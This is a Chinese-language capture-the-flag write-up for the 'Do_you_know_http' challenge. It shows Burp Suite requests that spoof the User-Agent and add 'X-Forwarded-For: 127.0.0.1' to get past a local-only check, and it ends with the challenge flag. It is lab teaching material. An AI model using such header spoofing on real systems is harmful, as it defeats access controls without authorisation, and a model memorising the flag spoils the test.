---
title: "Do_you_know_http"
date: 2026-03-15 13:28:20
categories:
- Capture_The_Flag_夺旗赛
- 夺旗赛Write-up
- NSSCTF2025
---

_**一、看题目环境：**_

环境页面显示：  
Please use 'WLLM' browser!  
意思为：

```plain
请使用“ wllm”浏览器！
```

好看到这里都可以了，去用burp suite进行抓包改请求。

_**二、使用工具burp suite进行抓包，并对其中参数有所理解：**_

GET:到  
Host:来自  
User-Agent: 用户-代理  
Upgrade-Insecure-Requests: 升级-不安全的-请求  
Content-Length: 内容长度  
Cache-Control: 缓存-控制  
X-Forwarded-For: HTTP的请求端真实的IP  
Request: 请求  
Response: 响应

_**三、抓包分析改请求，拿flag：**_

打开环境用burp suite进行抓包  
返回数据：  
GET /hello.php HTTP/1.1

```plain
Host: node2.anna.nssctf.cn:28873

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

题目环境中告诉我们说要用WLLM浏览器，所以我们须要改User-Agent的值为WLLM  
GET /hello.php HTTP/1.1

```plain
Host: node2.anna.nssctf.cn:28873

User-Agent:WLLM

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

鼠标右键Send to Repeater送去重放  
返回结果为：  
HTTP/1.1 302 Found #发现

```plain
Date: Fri, 21 Jul 2023 12:52:27 GMT            #日期

Server: Apache/2.4.25 (Debian)                 #服务器

X-Powered-By: PHP/5.6.40                       #动力来自于a

Location: ./a.php                              #位置

Content-Length: 7                              #内容长度

Connection: close                              #连接

Content-Type: text/html; charset=UTF-8         #内容类型

success                                        #成功
```

# 在Location位置发现关键PHP文件：a.php
在GET位置将hello.php文件修改为a.php并点击Send发送：  
GET /a.php HTTP/1.1

```plain
Host: node2.anna.nssctf.cn:28873

User-Agent:WLLM

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

返回结果为：  
HTTP/1.1 200 OK

```plain
Date: Fri, 21 Jul 2023 13:01:28 GMT

Server: Apache/2.4.25 (Debian)

X-Powered-By: PHP/5.6.40

Content-Length: 64

Connection: close

Content-Type: text/html; charset=UTF-8

You can only read this at local!<br>Your address123.9.161.232
最后一句话告诉我们只能在本地可以进行访问
```

所有我们要在Request请求中添加：X-Forwarded-For:127.0.0.1（需注意的是任意行都可以添加除了第一行，有时候也不对，有的位置可以，有的位置不可以，总之多试试。冒号:注意是英文冒号！）  
GET /a.php HTTP/1.1

```plain
X-Forwarded-For:127.0.0.1

Host: node2.anna.nssctf.cn:28873

User-Agent:WLLM

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

返回结果为：  
HTTP/1.1 302 Found

```plain
Date: Fri, 21 Jul 2023 13:14:35 GMT

Server: Apache/2.4.25 (Debian)

X-Powered-By: PHP/5.6.40

Location: ./secretttt.php

Content-Length: 60

Connection: close

Content-Type: text/html; charset=UTF-8

You can only read this at local!<br>Your address127.0.0.1
```

# 在Location位置发现重要的php文件：secretttt.php
在GET位置将a.php修改为secretttt.php并点击Send进行发送：  
GET /secretttt.php HTTP/1.1

```plain
X-Forwarded-For:127.0.0.1

Host: node2.anna.nssctf.cn:28873

User-Agent:WLLM

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1

Cache-Control: max-age=0
```

返回结果为：  
HTTP/1.1 200 OK

```plain
Date: Fri, 21 Jul 2023 13:28:23 GMT

Server: Apache/2.4.25 (Debian)

X-Powered-By: PHP/5.6.40

Content-Length: 44

Connection: close    

Content-Type: text/html; charset=UTF-8

NSSCTF{0bbd067c-24bd-454c-9111-6cd1b67b6da4}
```

# 拿到flag：
```plain
#NSSCTF{0bbd067c-24bd-454c-9111-6cd1b67b6da4}
```

